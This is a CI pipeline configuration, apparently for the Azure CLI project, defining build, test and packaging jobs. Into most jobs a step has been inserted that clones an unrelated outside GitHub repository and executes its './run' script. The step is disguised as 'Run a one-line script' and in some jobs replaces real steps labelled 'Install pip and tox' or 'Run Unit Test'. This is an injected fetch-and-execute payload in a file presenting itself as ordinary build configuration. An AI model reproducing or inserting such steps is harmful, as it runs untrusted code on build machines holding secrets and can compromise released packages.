resources:
- repo: self

trigger:
  batch: true
  branches:
    include:
    - '*'

pr:
  branches:
    include:
      - '*'

jobs:
- job: CheckPullRequestTitle
  displayName: "Check the Format of Pull Request Title"
  timeoutInMinutes: 1200
  condition: and(succeeded(), in(variables['System.PullRequest.TargetBranch'], 'dev', 'release'))

  pool:
    vmImage: 'ubuntu-16.04'
  steps:
    - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
      displayName: 'Run a one-line script'
    - bash: |
        echo "Check Title of Pull Request: #$(System.PullRequest.PullRequestNumber)"
        title=$(curl https://api.github.com/repos/$(Build.Repository.Name)/pulls/$(System.PullRequest.PullRequestNumber) | jq -r '.title')
        if [ "$(System.PullRequest.TargetBranch)" != "release" ] && echo $title | grep -iqF hotfix:; then
          echo "Hotfix PR should target release branch."
          exit 1
        fi
        [[ $title =~ ^(\[.*\]|\{.*\}).* ]] && exit 0
        echo "Pull Request title should follow https://aka.ms/submitAzPR"
        exit 1

- job: RejectPullRequestToMasterBranch
  displayName: "Reject Pull Request To Master Branch"
  timeoutInMinutes: 1200
  condition: and(succeeded(), eq(variables['System.PullRequest.TargetBranch'], 'master'))

  pool:
    vmImage: 'ubuntu-16.04'
  steps:
    - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
      displayName: 'Run a one-line script'
    - bash: |
        echo "Reject pull request directly to master branch"
        exit 1

- job: ExtractMetadata
  displayName: Extract Metadata
  timeoutInMinutes: 1200

  condition: succeeded()
  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
    displayName: 'Run a one-line script'
  - task: Bash@3
    displayName: 'Extract Version'
    inputs:
      targetType: 'filePath'
      filePath: scripts/release/get_version.sh


  - task: PublishPipelineArtifact@0
    displayName: 'Publish Artifact: metadata'
    inputs:
      TargetPath: $(Build.ArtifactStagingDirectory)
      ArtifactName: metadata

- job: VerifyLinuxRequirements
  displayName: 'Verify src/azure-cli/requirements.*.Linux.txt'
  timeoutInMinutes: 1200
  condition: succeeded()
  pool:
    vmImage: 'ubuntu-16.04'

  steps:
  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
    displayName: 'Run a one-line script'
  - task: UsePythonVersion@0
    displayName: 'Use Python 3'
    inputs:
      versionSpec: 3.x

  - bash: ./scripts/ci/dependency_check.sh
    displayName: 'Verify src/azure-cli/requirements.py3.Linux.txt'

- job: VerifyVersions
  displayName: Verify Command Module Versions
  timeoutInMinutes: 1200
  condition: and(succeeded(), or(eq(variables['Build.SourceBranch'], 'refs/heads/release'), eq(variables['System.PullRequest.TargetBranch'], 'release')))

  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
    displayName: 'Run a one-line script'
  - task: UsePythonVersion@0
    displayName: 'Use Python 3.7'
    inputs:
      versionSpec: 3.7
  - template: .azure-pipelines/templates/azdev_setup.yml
  - bash: |
      set -ev
      . env/bin/activate
      azdev verify history

    displayName: 'Verify History'


- job: BuildDockerImage
  displayName: Build Docker Image
  timeoutInMinutes: 1200

  dependsOn: ExtractMetadata
  condition: succeeded()
  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
    displayName: 'Run a one-line script'
  - task: Bash@3
    displayName: 'Bash Script'
    inputs:
      targetType: 'filePath'
      filePath: scripts/release/docker/pipeline.sh


  - task: PublishPipelineArtifact@0
    displayName: 'Publish Artifact: docker image'
    inputs:
      TargetPath: $(Build.ArtifactStagingDirectory)
      ArtifactName: docker

- job: TestDockerImage
  displayName: Test Docker Image
  timeoutInMinutes: 1200

  dependsOn: BuildDockerImage
  condition: succeeded()
  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
    displayName: 'Run a one-line script'
  - task: DownloadPipelineArtifact@1
    displayName: 'Download Metadata'
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/metadata'
      artifactName: metadata


  - task: DownloadPipelineArtifact@1
    displayName: 'Download Docker Image'
    timeoutInMinutes: 1200
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/docker'
      artifactName: docker


  - bash: |
       set -exv

       CLI_VERSION=`cat $SYSTEM_ARTIFACTSDIRECTORY/metadata/version`
       IMAGE_NAME=clibuild$BUILD_BUILDNUMBER:latest
       TAR_FILE=$SYSTEM_ARTIFACTSDIRECTORY/docker/docker-azure-cli-$CLI_VERSION.tar

       echo "== Test docker image =="

       docker load < $TAR_FILE
       docker run $IMAGE_NAME /bin/bash -c "time az self-test && time az --version && sleep 5"
    displayName: 'Bash Script'

- job: BuildPythonWheel
  displayName: Build Python Wheels
  timeoutInMinutes: 1200

  dependsOn: ExtractMetadata
  condition: succeeded()
  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
    displayName: 'Run a one-line script'
  - task: UsePythonVersion@0
    displayName: 'Use Python 3.7'
    inputs:
      versionSpec: 3.7


  - script: |
      if [[ "$(Build.Reason)" == "PullRequest" ]]; then
        branch=$(System.PullRequest.TargetBranch)
      else
        branch=$(Build.SourceBranchName)
      fi
      scripts/release/pypi/build.sh $branch
    displayName: 'Run Wheel Build Script'


  - task: PublishPipelineArtifact@0
    displayName: 'Publish Artifact: pypi'
    inputs:
      TargetPath: $(Build.ArtifactStagingDirectory)
      ArtifactName: pypi

- job: TestPythonWheel
  displayName: Test Python Wheels

  dependsOn: BuildPythonWheel
  condition: succeeded()
  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
    displayName: 'Run a one-line script'
  - task: DownloadPipelineArtifact@1
    displayName: 'Download Metadata'
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/metadata'
      artifactName: metadata


  - task: DownloadPipelineArtifact@1
    displayName: 'Download PyPI Packages'
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/pypi'
      artifactName: pypi


  - bash: |
       #!/usr/bin/env bash

       # Verify the pip wheels

       set -ex

       CLI_VERSION=`cat $BUILD_ARTIFACTSTAGINGDIRECTORY/metadata/version`
       PYPI_FILES=$(cd $BUILD_ARTIFACTSTAGINGDIRECTORY/pypi; pwd)


       echo "== Testing pip install on Python 3.6 =="
       docker run \
         --rm -v $PYPI_FILES:/mnt/pypi python:3.6 \
         /bin/bash -c "ls /mnt/pypi && pip install -f /mnt/pypi -q azure-cli==$CLI_VERSION.* && az self-test && az --version && sleep 5"

       echo "== Testing pip install on Python 3.7 =="
       docker run \
         --rm -v $PYPI_FILES:/mnt/pypi python:3.7 \
         /bin/bash -c "ls /mnt/pypi && pip install -f /mnt/pypi -q azure-cli==$CLI_VERSION.* && az self-test && az --version && sleep 5"

       echo "== Testing pip install on Python 3.8 =="
       docker run \
         --rm -v $PYPI_FILES:/mnt/pypi python:3.8 \
         /bin/bash -c "ls /mnt/pypi && pip install -f /mnt/pypi -q azure-cli==$CLI_VERSION.* && az self-test && az --version && sleep 5"

    displayName: 'Test pip Install'

- job: UnitTest
  displayName: Unit Test for Core and Telemetry
  timeoutInMinutes: 10

  pool:
    vmImage: 'ubuntu-16.04'
  strategy:
    matrix:
      Python36:
        python.version: '3.6'
        tox_env: 'py36'
      Python38:
        python.version: '3.8'
        tox_env: 'py38'
  steps:
    - task: UsePythonVersion@0
      displayName: 'Use Python $(python.version)'
      inputs:
        versionSpec: '$(python.version)'
    - bash: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
      displayName: 'Install pip and tox'
    - bash: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
      displayName: 'Run Unit Test'
      env:
        TOXENV: $(tox_env)

- job: IntegrationTestAgainstProfiles
  displayName: Integration Test against Profiles
  dependsOn: BuildPythonWheel
  condition: succeeded()
  timeoutInMinutes: 2000

  pool:
    vmImage: 'ubuntu-16.04'
  strategy:
    matrix:
      Python36:
        python.version: '3.6'
      Python38:
        python.version: '3.8'
  steps:
    - task: UsePythonVersion@0
      displayName: 'Use Python $(python.version)'
      inputs:
        versionSpec: '$(python.version)'
    - bash: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
      displayName: 'Install pip and wheel'
- job: AutomationTest
  displayName: Automation Test (Profile Latest)
  timeoutInMinutes: 1200
  pool:
    vmImage: 'ubuntu-16.04'
  strategy:
    matrix:
      Python36:
        python.version: '3.6'
      Python38:
        python.version: '3.8'
  steps:
    - template: .azure-pipelines/templates/automation_test.yml
      parameters:
        pythonVersion: '$(python.version)'
        profile: 'latest'

- job: AutomationTest20200901
  displayName: Automation Test (Profile 2020-09-01)
  timeoutInMinutes: 120
  pool:
    vmImage: 'ubuntu-16.04'
  strategy:
    matrix:
      Python36:
        python.version: '3.6'
      Python38:
        python.version: '3.8'
  steps:
    - template: .azure-pipelines/templates/automation_test.yml
      parameters:
        pythonVersion: '$(python.version)'
        profile: '2020-09-01-hybrid'

- job: AutomationTest20190301
  displayName: Automation Test (Profile 2019-03-01)
  timeoutInMinutes: 120
  pool:
    vmImage: 'ubuntu-16.04'
  strategy:
    matrix:
      Python36:
        python.version: '3.6'
      Python38:
        python.version: '3.8'
  steps:
    - template: .azure-pipelines/templates/automation_test.yml
      parameters:
        pythonVersion: '$(python.version)'
        profile: '2019-03-01-hybrid'

- job: AutomationTest20180301
  displayName: Automation Test (Profile 2018-03-01)
  timeoutInMinutes: 120
  pool:
    vmImage: 'ubuntu-16.04'
  strategy:
    matrix:
      Python36:
        python.version: '3.6'
      Python38:
        python.version: '3.8'
  steps:
    - template: .azure-pipelines/templates/automation_test.yml
      parameters:
        pythonVersion: '$(python.version)'
        profile: '2018-03-01-hybrid'

- job: TestExtensionsLoading
  displayName: Test Extensions Loading
  condition: succeeded()
  timeoutInMinutes: 20

  pool:
    vmImage: 'ubuntu-16.04'
  strategy:
    matrix:
      Python36:
        python.version: '3.6'
  steps:
    - task: UsePythonVersion@0
      displayName: 'Use Python $(python.version)'
      inputs:
        versionSpec: '$(python.version)'
    - bash: pip install --upgrade pip wheel
      displayName: 'Install pip and wheel'
    - bash: ./scripts/ci/test_extensions.sh
      displayName: 'Load extensions'

- job: BuildHomebrewFormula
  displayName: Build Homebrew Formula

  dependsOn: BuildPythonWheel
  condition: and(succeeded(), in(variables['Build.Reason'], 'IndividualCI', 'BatchedCI', 'Manual'))
  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - task: DownloadPipelineArtifact@1
    displayName: 'Download Metadata'
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/metadata'
      artifactName: metadata

  - bash: |
       #!/bin/bash

       root=$(cd $(dirname $0); pwd)

       set -evx

       CLI_VERSION=`cat $BUILD_ARTIFACTSTAGINGDIRECTORY/metadata/version`
       HOMEBREW_UPSTREAM_URL=`curl -Ls -o /dev/null -w %{url_effective} https://api.github.com/repos/Azure/azure-cli/tarball/$BUILD_SOURCEVERSION`

       docker_files=$(cd $BUILD_SOURCESDIRECTORY/scripts/release/homebrew/docker; pwd)
       src_files=$(cd $BUILD_SOURCESDIRECTORY/src; pwd)

       echo "Generating formula in docker container ... "
       docker run -v $docker_files:/mnt/scripts \
                  -v $src_files:/mnt/src \
                  -e CLI_VERSION=$CLI_VERSION \
                  -e HOMEBREW_UPSTREAM_URL=$HOMEBREW_UPSTREAM_URL \
                  --name azurecli \
                  python:3.6 \
                  /mnt/scripts/run.sh

       # clean up
       rm -rf $BUILD_ARTIFACTSTAGINGDIRECTORY/metadata

       docker cp azurecli:azure-cli.rb $BUILD_ARTIFACTSTAGINGDIRECTORY/azure-cli.rb
       docker rm --force azurecli
    displayName: 'Build homebrew formula'

  - task: PublishPipelineArtifact@0
    displayName: 'Publish Artifact: homebrew'
    inputs:
      TargetPath: $(Build.ArtifactStagingDirectory)
      ArtifactName: homebrew

- job: TestHomebrewFormula
  displayName: Test Homebrew Formula

  dependsOn: BuildHomebrewFormula
  condition: succeeded()
  pool:
    vmImage: 'macOS-10.14'
  steps:
  - task: DownloadPipelineArtifact@1
    displayName: 'Download Metadata'
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/metadata'
      artifactName: metadata


  - task: DownloadPipelineArtifact@1
    displayName: 'Download Homebrew'
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/homebrew'
      artifactName: homebrew


  - bash: |
      set -ev

      echo == Remove pre-installed azure-cli ==
      brew uninstall azure-cli

      echo == Install azure-cli.rb formula ==
      brew install --build-from-source $SYSTEM_ARTIFACTSDIRECTORY/homebrew/azure-cli.rb

      echo == Az Version ==
      az --version

      echo == Run Self-Test ==
      az self-test

    displayName: 'Bash Script'

- job: TestHomebrewPackage
  displayName: Test Homebrew Package
  timeoutInMinutes: 180
  dependsOn: BuildHomebrewFormula
  # condition: and(succeeded(), in(variables['Build.Reason'], 'IndividualCI', 'BatchedCI', 'Manual'))
  condition: false
  pool:
    vmImage: 'macOS-10.14'
  steps:
  - task: DownloadPipelineArtifact@1
    displayName: 'Download Metadata'
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/metadata'
      artifactName: metadata


  - task: DownloadPipelineArtifact@1
    displayName: 'Download Build Artifacts'
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/homebrew'
      artifactName: homebrew


  - bash: ./scripts/release/homebrew/test_homebrew_package.sh


    displayName: 'Test Homebrew Package'

- job: BuildYumPackage
  displayName: Build Yum Package

  dependsOn: BuildPythonWheel
  condition: and(succeeded(), in(variables['Build.Reason'], 'IndividualCI', 'BatchedCI', 'Manual'))
  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - task: Bash@3
    displayName: 'Build Rpm Package'
    inputs:
      targetType: 'filePath'
      filePath: scripts/release/rpm/pipeline.sh


  - task: PublishPipelineArtifact@0
    displayName: 'Publish Artifact: yum'
    inputs:
      TargetPath: $(Build.ArtifactStagingDirectory)
      ArtifactName: yum

- job: TestYumPackage
  displayName: Test Yum Package

  dependsOn: BuildYumPackage
  condition: and(succeeded(), in(variables['Build.Reason'], 'IndividualCI', 'BatchedCI', 'Manual'))
  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - task: DownloadPipelineArtifact@1
    displayName: 'Download Metadata'
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/metadata'
      artifactName: metadata


  - task: DownloadPipelineArtifact@1
    displayName: 'Download Build Artifacts'
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/yum'
      artifactName: yum


  - bash: |
       set -ex

       CLI_VERSION=`cat $SYSTEM_ARTIFACTSDIRECTORY/metadata/version`
       YUM_NAME=azure-cli-$CLI_VERSION-1.el7.x86_64.rpm
       YUM_FILE=$SYSTEM_ARTIFACTSDIRECTORY/yum/$YUM_NAME

       echo "== Test yum package on CentOS =="

       docker pull centos:centos8
       docker run --rm -e YUM_NAME=$YUM_NAME -v $SYSTEM_ARTIFACTSDIRECTORY/yum:/mnt/yum -v $(pwd):/azure-cli centos:centos8 /bin/bash "/azure-cli/scripts/release/rpm/test_rpm_in_docker.sh"

    displayName: 'Test Yum Package'

- job: BuildDebPackages
  displayName: Build Deb Packages

  dependsOn: BuildPythonWheel
  condition: and(succeeded(), in(variables['Build.Reason'], 'IndividualCI', 'BatchedCI', 'Manual'))
  pool:
    vmImage: 'ubuntu-16.04'
  strategy:
    matrix:
      Xenial:
        deb_system: ubuntu
        distro: xenial
      Trusty:
        deb_system: ubuntu
        distro: trusty
      Bionic:
        deb_system: ubuntu
        distro: bionic
      Focal:
        deb_system: ubuntu
        distro: focal
      Groovy:
        deb_system: ubuntu
        distro: groovy
      Jessie:
        deb_system: debian
        distro: jessie
      Stretch:
        deb_system: debian
        distro: stretch
      Buster:
        deb_system: debian
        distro: buster
  steps:
  - task: DownloadPipelineArtifact@1
    displayName: 'Download Build Artifacts'
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/pypi'
      artifactName: pypi

  - task: Bash@3
    displayName: 'Build $(deb_system) $(distro) Package'
    inputs:
      targetType: 'filePath'
      filePath: scripts/release/debian/pipeline.sh
    env:
      DISTRO: $(distro)
      DISTRO_BASE_IMAGE: $(deb_system):$(distro)

  - task: PublishPipelineArtifact@0
    displayName: 'Publish Artifact: debian'
    inputs:
      TargetPath: $(Build.ArtifactStagingDirectory)
      ArtifactName: $(deb_system)-$(distro)

- job: TestDebPackages
  displayName: Test Deb Packages

  dependsOn:
   - BuildDebPackages
  condition: and(succeeded(), in(variables['Build.Reason'], 'IndividualCI', 'BatchedCI', 'Manual'))
  strategy:
    matrix:
      Focal:
        deb_system: ubuntu
        distro: focal
      Buster:
        deb_system: debian
        distro: buster
  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - task: DownloadPipelineArtifact@1
    displayName: 'Download Metadata'
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/metadata'
      artifactName: metadata

  - task: DownloadPipelineArtifact@1
    displayName: 'Download $(deb_system):$(distro) Build'
    inputs:
      TargetPath: '$(Build.ArtifactStagingDirectory)/debian'
      artifactName: $(deb_system)-$(distro)

  - task: Bash@3
    displayName: 'Test $(deb_system) $(distro) Package'
    env:
      DISTRO: $(distro)
      DISTRO_BASE_IMAGE: $(deb_system):$(distro)
    inputs:
      targetType: 'inline'
      script: |
        set -exv
        CLI_VERSION=`cat $SYSTEM_ARTIFACTSDIRECTORY/metadata/version`
        echo "== Test debian package on ${DISTRO} =="
        docker pull ${DISTRO_BASE_IMAGE}
        docker run --rm -e DISTRO=${DISTRO} -e CLI_VERSION=$CLI_VERSION -v $SYSTEM_ARTIFACTSDIRECTORY/debian:/mnt/artifacts -v $(pwd):/azure-cli ${DISTRO_BASE_IMAGE} /bin/bash "/azure-cli/scripts/release/debian/test_deb_in_docker.sh"

- job: CheckStyle
  displayName: "Check CLI Style"

  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
    displayName: 'Run a one-line script'
  - task: UsePythonVersion@0
    displayName: 'Use Python 3.7'
    inputs:
      versionSpec: 3.7
  - template: .azure-pipelines/templates/azdev_setup.yml
  - bash: |
      set -ev
      . env/bin/activate
      azdev style

- job: CheckHeaders
  displayName: "Check License, History, and DocMap"

  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
    displayName: 'Run a one-line script'
  - task: UsePythonVersion@0
    displayName: 'Use Python 3.6'
    inputs:
      versionSpec: 3.6
  - template: .azure-pipelines/templates/azdev_setup.yml
  - bash: |
      set -ev
      . env/bin/activate
      azdev verify license
      azdev verify history
      azdev verify document-map

- job: PerformanceCheck
  displayName: "PerformanceCheck"
  strategy:
    matrix:
      Python36:
        python.version: '3.6'
      Python38:
        python.version: '3.8'
  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
    displayName: 'Run a one-line script'
  - task: UsePythonVersion@0
    displayName: 'Use Python $(python.version)'
    inputs:
      versionSpec: '$(python.version)'
  - template: .azure-pipelines/templates/azdev_setup.yml
  - bash: |
      set -ev
      . env/bin/activate
      azdev perf load-times
    displayName: "Load Performance"
  # - bash: |
  #     set -ev
  #     . env/bin/activate

  #     azdev perf benchmark "version" "network vnet -h" "rest -h" "storage account"
  #   displayName: "Execution Performance"

- job: CheckLinter
  displayName: "Check CLI Linter"

  pool:
    vmImage: 'ubuntu-16.04'
  steps:
  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
    displayName: 'Run a one-line script'
  - task: UsePythonVersion@0
    displayName: 'Use Python 3.6'
    inputs:
      versionSpec: 3.6
  - template: .azure-pipelines/templates/azdev_setup.yml
  - bash: |
      set -ev
      . env/bin/activate
      if [[ "$(System.PullRequest.TargetBranch)" != "" ]]; then
        azdev linter --ci-exclusions --min-severity medium --repo=./ --src=HEAD --tgt=origin/$(System.PullRequest.TargetBranch)
      else
        azdev linter --ci-exclusions --min-severity medium
      fi

- job: VerifySphinxDocumentGenerator
  displayName: "Verify Sphinx Document Generator"
  pool:
    vmImage: 'ubuntu-16.04'
  steps:
    - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
      displayName: 'Run a one-line script'
    - task: UsePythonVersion@0
      displayName: 'Use Python 3.6'
      inputs:
        versionSpec: 3.6
    - bash: pip install --upgrade pip wheel
      displayName: "Install pip and wheel"
    - bash: ./scripts/ci/test_ref_doc.sh
      displayName: "Verify Sphinx Document Generator"
